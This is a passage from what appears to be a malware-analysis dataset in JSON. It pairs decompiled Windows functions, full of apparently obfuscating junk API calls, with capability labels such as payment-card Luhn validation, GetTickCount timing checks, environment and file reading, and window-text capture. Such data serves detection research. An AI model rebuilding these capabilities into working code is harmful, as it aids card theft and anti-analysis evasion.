0x56c8d308, var_ch - 1U & -extraout_ECX);\n        uVar3 = (*_sym.imp.IMAGEHLP.dll_EnumerateLoadedModules)(0x9d6c020b, uVar1, 0x3fc415ca, 0x937e5fa5);\n        iVar2 = uVar3 >> 0x20;\n        in_EAX = uVar3;\n    }\n    *0x42a08a = iVar2;\n    *0x42a126 = in_EAX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x429fc2, 8, 0x18e);\n    if (*0x42a126 != 0) {\n        *0x42a2ae = *0x42a2ae - *0x42a08a;\n    }\n    *0x42a2ae = *0x42a2ae + 0x360ff720;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(uVar1, 199);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x429fc2, 0, uVar1);\n    return *0x42a352;\n}\n",
        "token_count": 851
    },
    "0042dfc3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.0042dfc3(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    ulong uVar4;\n    uint riid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(0x42a186);\n    if (0x3f6b8b5 < *0x429ed6) {\n        unaff_EBX = *0x42a1ea ^ 0xedab7108;\n    }\n    *0x42a05e = *0x42a05e >> 6;\n    if ((arg_8h != unaff_EBX) && (*0x42a05e = *0x42a05e - unaff_EBX,  *0x42a05e != 0)) {\n        unaff_EBX = arg_8h | *0x429f66;\n        *0x42a05e = *0x42a05e - 1;\n    }\n    *0x42a012 = *0x42a012 + -0x5de6a41b;\n    *0x42a05e = *0x42a05e + unaff_EBX;\n    uVar3 = (arg_ch & 0x29953c28) - arg_8h;\n    *0x429ff6 = arg_8h;\n    (*_sym.imp.GDI32.dll_DeleteObject)(var_14h);\n    uVar1 = *0x429ff6;\n    if ((*0x42a1ba < 0xa9fc0b3d) && (0xf767027b < *0x42a31a)) {\n        (*_sym.imp.DSSENH.dll_CPHashSessionKey)(uVar3, 0x76991414, 0xe9514661);\n        (*_sym.imp.IASHLPR.dll_AllocateAttributes)(0xbebb5089, *0x42a05e, *0x429eca);\n        (*_sym.imp.KERNEL32.dll_GetConsoleKeyboardLayoutNameW)(0xaf98d6c6, *0x429eca, 0x90a9903d, extraout_EDX);\n        uVar4 = (*_sym.imp.DSSENH.dll_CPReleaseContext)(0x98e4dd70, 0x334b0116, 0x8acc0dde, 0x8acc0dde, unaff_EBX);\n        uVar2 = uVar4;\n        *0x42a05e = *0x42a05e + (uVar3 ^ uVar2);\n        (*_sym.imp.ODBC32.dll_SQLDescribeCol)(0x876e000c, uVar4 >> 0x20, 0x4a9fb7d3, *0x42a05e, 0xcc499eb6, 0xe6600386);\n        (*_sym.imp.CATSRVPS.dll_GetProxyDllInfo)(extraout_EDX_00);\n        (*_sym.imp.NTSHRUI.dll_DllGetClassObject)(extraout_EDX_01, uVar2);\n        (*_sym.imp.ODBC32.dll_SQLDriverConnect)(0x8acc0dde, *0x429eca);\n        (*_sym.imp.ODBC32.dll_SQLSetCursorNameW)(uVar2, 0xa9866a25, 0x8acc0dde, 0xe4468fe0, uVar2);\n    }\n    return uVar1 & 1 << (arg_ch & 0x1f);\n}\n",
        "token_count": 899
    },
    "0042e176": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable",
            "get common file path",
            "move file",
            "get graphical window text",
            "read file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint __cdecl fcn.0042e176(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    int32_t iVar6;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar7;\n    uint var_14h;\n    uint lpString;\n    uint lpBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x429ede;\n    *0x42a31e = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0x24ead95b);\n    *0x429ffe = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x42a31e, 8, 0x2e4);\n    *0x42a25a = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0x851c46ab, iVar1, 0x5ba27efb, iVar1, iVar1);\n    *0x42a29e = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x42a25a, 8, 0xf6);\n    fcn.0042e452();\n    *0x42a03e = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0xcfcfa040);\n    *0x42a33e = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)(0x1d1);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x42a03e, 8);\n    uVar3 = (*_sym.imp.USER32.dll_GetWindowTextW)(*0x429f2a, uVar2, 0xe8);\n    fcn.0042ca85(0x9399cbcb, 0x851c46ab, 0x851c46ab, 0x851c46ab);\n    iVar6 = -(iVar1 + -0x7ae3b955);\n    *0x42a0d2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(arg_8h);\n    uVar2 = *0x42a0d2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x42a0d2, 8, 0x248);\n    uVar2 = fcn.0042c4bb(uVar2);\n    uVar7 = *0x42a26e + 0x98e2c03c;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)\n              (0x429fda, 2, \n               (in_NT & 1) * 0x4000 | SBORROW4(*0x42a26e, 0x671d3fc4) * 0x800 | (in_IF & 1) * 0x200 |\n               (in_TF & 1) * 0x100 | (uVar7 < 0) * 0x80 | (uVar7 == 0) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(uVar7 & 0xff) & 1U) == 0) * 4 | *0x42a26e < 0x671d3fc4 | (in_ID & 1) * 0x200000 |\n               (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    uVar7 = *0x429fd2;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(*0x429fd2, 0xf01f, 0);\n    if ((uVar7 & 1) != 0 || (uVar7 & 0x40) != 0) {\n        uVar5 = (*_sym.imp.ODBC32.dll_ODBCInternalConnectW)(0xa718c639, 0xfe1daeec, 0x28da2aa);\n        iVar1 = iVar1 + 0xa388d56;\n        uVar5 = (*_sym.imp.DSSENH.dll_CPDestroyKey)(uVar5);\n        uVar5 = (*_sym.imp.ODBC32.dll_SQLGetInfo)(0x271fcca8, 0xa7e5201d, uVar5, uVar5, uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_MoveFileExA)(uVar5);\n        uVar5 = (*_sym.imp.DSSENH.dll_CPSetProvParam)(extraout_ECX, 0x6cd559e5, iVar6, uVar5, 0x7a40591a);\n        (*_sym.imp.USER32.dll_BeginPaint)(uVar5, uVar5, 0x87a5768b, 0xb7f31660, iVar1, iVar6);\n        uVar5 = (*_sym.imp.DSSENH.dll_CPGetProvParam)(iVar1, 0x2d57051c, 0xa324f68a, iVar1, 0xe04bb935, 0x2a8bf9a7);\n        uVar5 = (*_sym.imp.USER32.dll_DdeAccessData)(uVar5);\n        uVar5 = (*_sym.imp.ODBC32.dll_SQLColumns)(0x6a540960, uVar5, iVar1, 0x1c03119e, iVar1, 0x12dd0ac6);\n        (*_sym.imp.USER32.dll_ToAsciiEx)(iVar6, iVar6, 0x54ead347, 0xdba0d494, uVar5);\n        (*_sym.imp.DSSENH.dll_CPSignHash)(0x65d5548b, 0x3f2b51fc, 0x7f2ca9f6, 0xc8485d3d);\n    }\n    (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(*0x42a33e);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a03e, 0, uVar3, 0);\n    (*_sym.imp.KERNEL32.dll_ReadFile)(*0x429f36, uVar4, 0x248, 0x42a2b2);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(*0x42a29e, 0xf6);\n    (*_sym.imp.KERNEL32.dll_ReadFile)(*0x42a082, *0x429ffe, 0x2e4, 0x42a146, 0);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a31e, 0, *0x429ffe);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a25a, 0, *0x42a29e);\n    *0x42a28a = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x42a1fa, 0x80000000, 2, 0, 3, 1, 0, uVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a0d2, 0);\n    return uVar2;\n}\n",
        "token_count": 1698
    },
    "0042e452": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __fastcall fcn.0042e452(uint32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint in_EAX;\n    uint uVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    uint8_t in_AF;\n    uint8_t uVar4;\n    uint8_t in_TF;\n    uint8_t uVar5;\n    uint8_t in_IF;\n    uint8_t uVar6;\n    uint8_t in_NT;\n    uint8_t uVar7;\n    uint8_t in_AC;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t in_VIP;\n    uint8_t uVar10;\n    uint8_t in_ID;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    ulong uVar13;\n    uint32_t uVar14;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar12 = (in_NT & 1) * 0x4000 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (*0x42a0b2 + 0x253b8ab9 < 0) * 0x80 |\n             (*0x42a0b2 == -0x253b8ab9) * 0x40 | (in_AF & 1) * 0x10 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 |\n             (in_AC & 1) * 0x40000;\n    *0x42a196 = unaff_ESI;\n    *0x42a1b6 = param_1;\n    *0x42a24e = in_EAX;\n    *0x42a252 = param_2;\n    *0x42a36a = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uVar13 = CONCAT44(*0x42a252, *0x42a24e);\n    uVar7 = (uVar12 & 0x4000) != 0;\n    uVar6 = (uVar12 & 0x200) != 0;\n    uVar5 = (uVar12 & 0x100) != 0;\n    uVar4 = (uVar12 & 0x10) != 0;\n    uVar11 = (uVar12 & 0x200000) != 0;\n    uVar8 = (uVar12 & 0x40000) != 0;\n    uVar10 = 0;\n    uVar9 = 0;\n    uVar3 = *0x42a1b6;\n    if ((uVar12 & 0x40) != 0) {\n        (*_sym.imp.KERNEL32.dll_GetEnvironmentStrings)(0x509c0b9b, 0x45953322);\n        (*_sym.imp.IMAGEHLP.dll_SymGetSymFromName64)(0xa83947c5);\n        uVar2 = (*_sym.imp.NTSHRUI.dll_GetLocalPathFromNetResourceA)(0xcbfeeae3);\n        uVar2 = (*_sym.imp.USER32.dll_EndPaint)(uVar2);\n        uVar13 = (*_sym.imp.DSSENH.dll_CPGenRandom)(uVar2, uVar2, 0xbb038d42, 0x596ac7fb);\n        uVar3 = extraout_ECX;\n    }\n    *0x42a08e = uVar13;\n    uVar1 = *0x42a35e + 0x13ee4c79;\n    *0x42a12e = uVar3;\n    uVar14 = *0x42a36a;\n    *0x42a2c2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)\n                          (*0x42a36a, 8, 0x79, \n                           (uVar7 & 1) * 0x4000 | SBORROW4(*0x42a35e, -0x13ee4c79) * 0x800 |\n                           ((uVar12 & 0x400) != 0) * 0x400 | (uVar6 & 1) * 0x200 | (uVar5 & 1) * 0x100 |\n                           (uVar1 < 0) * 0x80 | (uVar1 == 0) * 0x40 | (uVar4 & 1) * 0x10 |\n                           ((POPCOUNT(uVar1 & 0xff) & 1U) == 0) * 4 | *0x42a35e < 0xec11b387 | (uVar11 & 1) * 0x200000 |\n                           (uVar10 & 1) * 0x100000 | (uVar9 & 1) * 0x80000 | (uVar8 & 1) * 0x40000);\n    uVar3 = *0x42a08e;\n    *0x429f76 = *0x42a12e;\n    if ((uVar14 & 0x40) == 0) {\n        *0x429f86 = -*0x429f86;\n        *0x429f76 = *0x42a08e | 0x8d33d467;\n    }\n    *0x429f86 = *0x429f86 | *0x42a08e;\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(*0x42a2c2, 0x79);\n    *0x429f86 = *0x429f86 & uVar13 >> 0x20;\n    *0x429f86 = *0x429f86 - uVar3;\n    if (*0x429f86 != 0) {\n        *0x429f86 = *0x429f86 | uVar3 ^ *0x429eb2;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a36a, 0, *0x42a2c2);\n    return in_EAX;\n}\n",
        "token_count": 1441
    }
}